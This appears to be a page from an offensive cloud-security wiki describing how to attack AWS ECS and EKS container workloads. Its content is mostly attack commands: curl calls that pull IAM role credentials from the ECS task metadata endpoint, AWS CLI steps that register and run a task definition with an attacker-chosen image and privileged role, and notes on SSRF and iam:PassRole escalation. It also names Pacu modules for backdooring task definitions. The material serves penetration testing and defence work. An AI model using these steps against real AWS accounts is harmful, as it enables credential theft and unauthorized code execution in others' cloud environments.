---
title: "Containers: ECS and EKS task-role and runtime abuse"
description: "Attacking ECS and EKS workloads: task role theft through the task metadata endpoint, task-definition abuse, and reaching the container runtime."
keywords:
  - ECS
  - EKS
  - task role
  - task metadata
  - container
---

# Containers

AWS runs containers through ECS (its own orchestrator) and EKS (managed Kubernetes). Both attach an IAM role to the workload, and both expose a metadata endpoint inside the container that hands out that role's credentials, which makes container RCE an AWS credential-theft path. Writing a task definition is itself an execution primitive: you choose the image, command, and role it runs as.

## Stealing the task role (ECS)

```bash
# Inside an ECS task, the role creds come from the task metadata endpoint
curl -s ${ECS_CONTAINER_METADATA_URI_V4}/task
curl -s 169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}
```

## Running your own task

```bash
# Register a task definition with your image and a privileged task role, then run it
aws ecs register-task-definition --family x --task-role-arn <privileged-role> \
  --container-definitions '[{"name":"c","image":"<you>/img","essential":true}]'
aws ecs run-task --cluster <c> --task-definition x
```

## EKS

```bash
aws eks update-kubeconfig --name <cluster>   # needs eks:DescribeCluster + the aws-auth mapping
kubectl auth can-i --list
```

## Exploitation notes

- `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` is the ECS equivalent of IMDS; a server-side request forgery inside a task reaches it just like EC2 SSRF reaches 169.254.169.254.
- Registering and running a task needs `iam:PassRole` on the task role, so it is also an identity privilege-escalation path.
- Generic Kubernetes attacks (RBAC, service-account tokens, pod escape) live in the Containers area; the pages here stay on the AWS control-plane and node-identity angle.

## Tools

- **AWS CLI** (`ecs register-task-definition`, `run-task`, `eks update-kubeconfig`).
- **Pacu** (`ecs__enum`, `ecs__backdoor_task_def`): ECS enumeration and task-definition backdooring.
- **kubectl** / **Peirates**: in-cluster work on EKS.

## References

- [HackTricks Cloud: ECS and EKS](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-ecs-enum.html)
- [AWS: task IAM roles](https://docs.aws.amazon.com/AmazonECS/latest/developerguide/task-iam-roles.html)
